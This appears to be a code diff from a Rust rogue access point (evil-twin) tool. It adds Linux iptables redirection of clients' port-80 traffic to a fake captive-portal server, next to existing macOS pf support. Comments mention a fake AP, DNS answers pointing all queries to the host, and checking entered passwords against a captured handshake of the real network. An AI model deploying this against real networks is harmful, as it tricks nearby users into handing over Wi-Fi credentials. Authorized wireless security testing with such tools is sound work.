@@ -105,13 +105,13 @@ where
     // Optional offline verifier (captured handshake of the real network).
     let verifier = load_verifier(&config, &on_event);
 
-    // Intercept port 80 of portal clients via pf so captive-portal
+    // Intercept port 80 of portal clients (pf / iptables) so captive-portal
     // detection probes land on this server.
     let redirect = enable_redirect(config.port);
     let redirect_active = redirect.is_ok();
     if let Err(ref e) = redirect {
         on_event(PortalEvent::Log(format!(
-            "⚠️ pf redirect inactive ({e}) — the portal only serves direct requests"
+            "⚠️ port-80 redirect inactive ({e}) — the portal only serves direct requests"
         )));
     }
 
@@ -474,7 +474,15 @@ You can now use the internet.</p>
     )
 }
 
-// --- pf (port 80 redirect) --------------------------------------------------
+// --- Port-80 redirect (pf on macOS, iptables on Linux) ----------------------
+
+/// Snapshot of the redirect so `disable_redirect` can restore it exactly.
+enum Redirect {
+    /// macOS packet-filter anchor.
+    Pf(PfRedirect),
+    /// Linux iptables nat rule.
+    Iptables { iface: String, port: u16 },
+}
 
 /// Snapshot of pf state so `disable_redirect` can restore it exactly.
 struct PfRedirect {
@@ -515,7 +523,109 @@ fn pf_enabled() -> bool {
 }
 
 /// Redirect port 80 of portal clients to the portal HTTP server.
-fn enable_redirect(port: u16) -> Result<PfRedirect> {
+fn enable_redirect(port: u16) -> Result<Redirect> {
+    if cfg!(target_os = "linux") {
+        return enable_redirect_linux(port);
+    }
+    enable_redirect_macos(port).map(Redirect::Pf)
+}
+
+/// Restore the original redirect configuration.
+fn disable_redirect(redirect: &Redirect) -> Result<()> {
+    match redirect {
+        Redirect::Pf(pf) => disable_redirect_pf(pf),
+        Redirect::Iptables { iface, port } => {
+            // Delete mirrors the -A rule exactly.
+            let _ = Command::new("iptables")
+                .args([
+                    "-t",
+                    "nat",
+                    "-D",
+                    "PREROUTING",
+                    "-i",
+                    iface,
+                    "-p",
+                    "tcp",
+                    "--dport",
+                    "80",
+                    "-j",
+                    "REDIRECT",
+                    "--to-port",
+                    &port.to_string(),
+                ])
+                .output();
+            Ok(())
+        }
+    }
+}
+
+/// Linux: nat PREROUTING rule scoped to the AP interface. dnsmasq already
+/// resolves every client query to this host, so captive-portal detection
+/// probes hit this redirect and pop the login page.
+fn enable_redirect_linux(port: u16) -> Result<Redirect> {
+    if unsafe { libc::geteuid() } != 0 {
+        return Err(anyhow!("root required"));
+    }
+
+    let iface = find_ap_interface_linux()
+        .ok_or_else(|| anyhow!("AP interface not found — is the fake AP running?"))?;
+
+    let add = Command::new("iptables")
+        .args([
+            "-t",
+            "nat",
+            "-A",
+            "PREROUTING",
+            "-i",
+            &iface,
+            "-p",
+            "tcp",
+            "--dport",
+            "80",
+            "-j",
+            "REDIRECT",
+            "--to-port",
+            &port.to_string(),
+        ])
+        .output()
+        .context("failed to run iptables (sudo apt install iptables)")?;
+    if !add.status.success() {
+        return Err(anyhow!(
+            "iptables rejected the redirect: {}",
+            String::from_utf8_lossy(&add.stderr).trim()
+        ));
+    }
+
+    Ok(Redirect::Iptables { iface, port })
+}
+
+/// The interface holding the AP gateway address (`ip -4 addr show`).
+fn find_ap_interface_linux() -> Option<String> {
+    let output = Command::new("ip")
+        .args(["-4", "addr", "show"])
+        .output()
+        .ok()?;
+    let text = String::from_utf8_lossy(&output.stdout);
+    let needle = format!("inet {}/", super::rogue_ap::AP_GATEWAY);
+
+    let mut current: Option<String> = None;
+    for line in text.lines() {
+        if !line.starts_with(char::is_whitespace) {
+            // Block header, e.g. "3: wlan0 <BROADCAST,MULTICAST,UP,...>"
+            current = line
+                .split(':')
+                .nth(1)
+                .and_then(|rest| rest.split_whitespace().next())
+                .map(str::to_string);
+        } else if line.contains(&needle) {
+            return current;
+        }
+    }
+    None
+}
+
+/// macOS: pf anchor redirect.
+fn enable_redirect_macos(port: u16) -> Result<PfRedirect> {
     if unsafe { libc::geteuid() } != 0 {
         return Err(anyhow!("root required"));
     }
@@ -559,7 +669,7 @@ fn enable_redirect(port: u16) -> Result<PfRedirect> {
 }
 
 /// Restore the original pf ruleset (and disable pf if we enabled it).
-fn disable_redirect(redirect: &PfRedirect) -> Result<()> {
+fn disable_redirect_pf(redirect: &PfRedirect) -> Result<()> {
     let _ = Command::new("pfctl").args(["-f", PF_ORIGINAL]).output();
     if !redirect.was_enabled {
         let _ = Command::new("pfctl").arg("-d").output();
